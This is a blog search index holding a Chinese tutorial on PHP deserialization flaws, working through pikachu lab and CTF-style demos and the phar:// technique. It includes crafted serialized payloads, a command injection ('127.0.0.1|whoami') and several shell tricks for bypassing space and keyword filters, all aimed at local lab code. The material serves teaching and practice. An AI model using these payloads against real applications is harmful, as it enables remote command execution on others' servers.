<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2021/08/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/08/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><strong>在进行反序列化时会执行类中的魔法函数，如果魔法函数的参数是输入可控的那么就可能造成命令执行漏洞</strong></p><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231534.png"></p><p>查看后端部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现没有对输入做任何过滤，那就随便构造payload</p><p>O:1:”S”:1:{s:4:”test”;s:29:”<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>“;}</p><p>传到后端后首先反序列化，然后调用wakeup魔法函数，即回显test变量，这个时候前台就会弹窗xss</p><h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><h3 id="最简单的一个demo"><a href="#最简单的一个demo" class="headerlink" title="最简单的一个demo"></a>最简单的一个demo</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>=<span class="string">&#x27;GGG&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//echo &quot;This is function __contruct()&quot;;</span></span><br><span class="line"> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;str);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">var_dump(unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入如下：</p><p><a href="http://127.0.0.1/fanxu/1.php?obj=O:4:&quot;Test&quot;:1:%7Bs:3:&quot;str&quot;;s:10:&quot;phpinfo();&quot;;%7D">http://127.0.0.1/fanxu/1.php?obj=O:4:&quot;Test&quot;:1:{s:3:&quot;str&quot;;s:10:&quot;phpinfo();&quot;;}</a></p><p>成功回显</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231618.png"></p><h3 id="利用反序列化漏洞来进行命令执行"><a href="#利用反序列化漏洞来进行命令执行" class="headerlink" title="利用反序列化漏洞来进行命令执行"></a>利用反序列化漏洞来进行命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在对象被销毁时，会自动调用__destruct()方法</span></span><br><span class="line"><span class="comment">     * 此方法中会执行回调函数，即ping方法</span></span><br><span class="line"><span class="comment">     * 可以在实例化对象时将method设为ping，尝试命令执行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// in_array() 函数搜索数组中是否存在指定的值，这里method如果是ping，则返回true</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>)))&#123;</span><br><span class="line">            <span class="comment">// 调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ping方法使用了system执行系统命令,为可利用点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> system(<span class="string">&quot;ping -c 2 <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">@unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>由代码看出来执行顺序为$a-&gt;unserialize-&gt;wakeup-&gt;waf-&gt;destruct-&gt;ping</strong></p><p>当我们反序列化时首先执行wakeup函数，它会将args变量送入waf进行过滤，该waf较为简单只是过滤了空格</p><blockquote><p><strong>destruct函数规定了method必须为ping</strong></p><p><strong>call_user_func_array的参数必须是数组类型，所以$this-&gt;args必须是数组</strong></p><p><strong>注意：</strong></p><p><strong>类中属性为private时，表示方式是在属性名前加上 %00类名%00</strong></p><p><em><em>类中属性为protected时，表示方式是在属性名前加上 %00</em>%00</em>*</p></blockquote><p>构造序列化字符串如下：</p><p>O:4:”home”:2:{s:12:”%00home%00method”;s:4:”ping”;s:10:”%00home%00args”;a:1:{i:0;s:16:”127.0.0.1|whoami”;};}</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231552.png"></p><p>成功回显：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231635.png"></p><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a><strong>空格过滤绕过</strong></h3><p>waf对于空格进行了过滤，如果我们要查看当前目录下的flag.txt时，type或者cat都有空格</p><p>那么可以通过如下来绕过空格</p><p>type.\flag.txt </p><p>type,flag.txt</p><p>cat${IFS}flag.txt</p><p>cat$flag.txt</p><p>cat&lt;flag.txt</p><p>cat&lt;&gt;flag.txt</p><p>{cat,flag.txt}</p><h3 id="demo-3（增强waf）"><a href="#demo-3（增强waf）" class="headerlink" title="demo 3（增强waf）"></a>demo 3（增强waf）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="number">2</span> error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="number">3</span> <span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line"> <span class="number">4</span>     <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line"> <span class="number">5</span>     <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"> <span class="number">6</span>     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"> <span class="number">7</span>         <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line"> <span class="number">8</span>         <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line"> <span class="number">9</span>     &#125;</span><br><span class="line"><span class="number">10</span>     <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="number">11</span>         <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="number">12</span>             <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(trim(<span class="variable">$v</span>));</span><br><span class="line"><span class="number">13</span>         &#125;</span><br><span class="line"><span class="number">14</span>     &#125;</span><br><span class="line"><span class="number">15</span>     <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="number">16</span>         <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="number">17</span>         <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="number">18</span>         <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="number">19</span>     &#125;           </span><br><span class="line"><span class="number">20</span>     <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line"><span class="number">21</span>         system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>.<span class="variable">$host</span>);</span><br><span class="line"><span class="number">22</span>     &#125;</span><br><span class="line"><span class="number">23</span>     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="number">24</span>         <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line"><span class="number">25</span>             call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line"><span class="number">26</span>         &#125;</span><br><span class="line"><span class="number">27</span>     &#125; </span><br><span class="line"><span class="number">28</span> </span><br><span class="line"><span class="number">29</span> &#125;</span><br><span class="line"><span class="number">30</span> </span><br><span class="line"><span class="number">31</span> <span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="number">32</span> <span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="number">33</span> <span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="number">34</span> <span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="number">35</span> <span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="number">36</span> <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="number">37</span>         <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)</span><br><span class="line"><span class="number">38</span>         &#123;</span><br><span class="line"><span class="number">39</span>             <span class="variable">$i</span>++;   </span><br><span class="line"><span class="number">40</span>             <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="number">41</span>         &#125;</span><br><span class="line"><span class="number">42</span>         <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line"><span class="number">43</span> &#125;</span><br><span class="line"><span class="number">44</span> <span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line"><span class="number">45</span> &#123;</span><br><span class="line"><span class="number">46</span>     @parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="number">47</span>     <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)</span><br><span class="line"><span class="number">48</span>     &#123;</span><br><span class="line"><span class="number">49</span>         <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)</span><br><span class="line"><span class="number">50</span>         &#123;</span><br><span class="line"><span class="number">51</span>             <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="number">52</span>             &#123;</span><br><span class="line"><span class="number">53</span>                 <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="number">54</span>                 <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line"><span class="number">55</span>                 unserialize(<span class="variable">$come</span>); </span><br><span class="line"><span class="number">56</span>             &#125;</span><br><span class="line"><span class="number">57</span>         &#125;</span><br><span class="line"><span class="number">58</span>         <span class="keyword">else</span></span><br><span class="line"><span class="number">59</span>         &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="number">60</span>     &#125;</span><br><span class="line"><span class="number">61</span>     <span class="keyword">else</span></span><br><span class="line"><span class="number">62</span>     &#123;</span><br><span class="line"><span class="number">63</span>         <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line"><span class="number">64</span>     &#125;</span><br><span class="line"><span class="number">65</span> &#125;</span><br><span class="line"><span class="number">66</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">67</span> &#123;</span><br><span class="line"><span class="number">68</span>     <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="number">69</span> &#125;</span><br><span class="line"><span class="number">70</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一道反序列化的题目</p><p>首先如果要进行反序列化操作，那么就要通过前面的各种if</p><blockquote><p>parse_str函数</p><p>表示将字符串解析成多个变量，语法是parse_str(string,array)</p><p>比如parse_str(“name=Bill&amp;age=60”)</p><p>就相当于</p><p>$name=”Bill”;</p><p>$age=60;</p></blockquote><p>输入</p><p><a href="http://127.0.0.1/fanxu/3.php?first=doller&amp;a=var=give&bbb=me&ccc=flag">http://127.0.0.1/fanxu/3.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</a></p><blockquote><p>注意前面一个是&amp;，后面两个是&amp;的url编码%26，因为只有这样服务器才知道参数a的值为var=give&amp;bbb=me&amp;ccc=flag，从而给这三个变量赋值</p></blockquote><p>这时候通过了所有的if判断，页面回显如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231925.png"></p><p>说明我们进入到反序列化步骤啦，这时候hackbar来构造我们的come参数</p><ol><li><p>在反序列化时首先会执行wakeup函数</p><p>从foreach可以看出我们传入的args变量必须是数组，然后wakeup会将args的值送到waf中进行过滤再返回回来</p></li><li><p>然后会执行destruct函数</p><p>它使用了call_user_func_array这个php内置的方法，第一个参数是要调用的函数，第二个参数<strong>必须</strong>是一个数组，用于给调用的函数传参。</p><p>我们看看进入call_user_func_array()函数前的if判断，它判断我们要调用的函数名是否在一个允许调用的列表里，而这个列表就只有echos这一个函数，也就是说我们的method变量已经限定死了，必须为echos。</p></li><li><p>执行echos函数</p><p>对于echos函数，他可以执行system函数，我们就想可能存在命令执行漏洞</p></li></ol><p>思路：</p><blockquote><p>1、通过反序列化控制method和args两个成员变量来绕过waf</p><p>2、 method必须是echos不然通不过if判断</p><p>3、通过call_user_func_array()函数第一个参数调用本类中的echos方法，第二个参数给方法传参- </p><p>4、由于echos方法中的system函数的参数是拼接形参的，完成命令注入。</p></blockquote><p>我们进行命令注入最主要就是绕过waf，我们来看看waf干了啥：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>过滤掉了[&lt;&gt;*;|?\n ]，flag这些字符，其中过滤掉了|我们还有&amp;可以用</p><blockquote><p>&amp;是不管前后命令是否执行成功都会执行前后命令</p></blockquote><p>过滤掉了空格可以用demo2的方法</p><p>过滤掉flag可以通过双写绕过</p><p>其他的过滤符号对我们命令执行也没啥限制</p><p>构造come参数如下：</p><p>come=O:4:”come”:2:{s:12:”%00come%00method”;s:5:”echos”;s:10:”%00come%00args”;a:1:{i:0;s:19:”%26type.\flaflagg.txt”;};}</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231933.png"></p><p>成功拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231944.png"></p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1485821">https://cloud.tencent.com/developer/article/1485821</a></p></blockquote><h2 id="phar-来触发反序列化"><a href="#phar-来触发反序列化" class="headerlink" title="phar://来触发反序列化"></a>phar://来触发反序列化</h2><p><strong>某些情况下没有unserialize()函数进行反序列化时，可以使用文件系统函数配合phar://来进行反序列化</strong></p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”</p><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><ol><li><p><strong>stub</strong></p><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p></li><li><h5 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a><strong>manifest</strong></h5><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是攻击手法最核心的地方。</p></li><li><h5 id="contents"><a href="#contents" class="headerlink" title="contents"></a><strong>contents</strong></h5><p>被压缩文件的内容。</p></li><li><h5 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h5><p>签名，放在文件末尾。</p></li></ol><h3 id="demo测试"><a href="#demo测试" class="headerlink" title="demo测试"></a>demo测试</h3><p>首先创建一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后就会生成一个phar文件</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808231956.png"></p><p>用记事本查看</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232002.png"></p><p>明显可以看到meta-data是以序列化的形式存储的</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232008.png"></p><p>测试利用phar文件加文件函数反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到成功反序列化了</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232016.png"></p><p>那么我们就可以通过文件上传的方式来触发反序列化漏洞：</p><p>后端：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 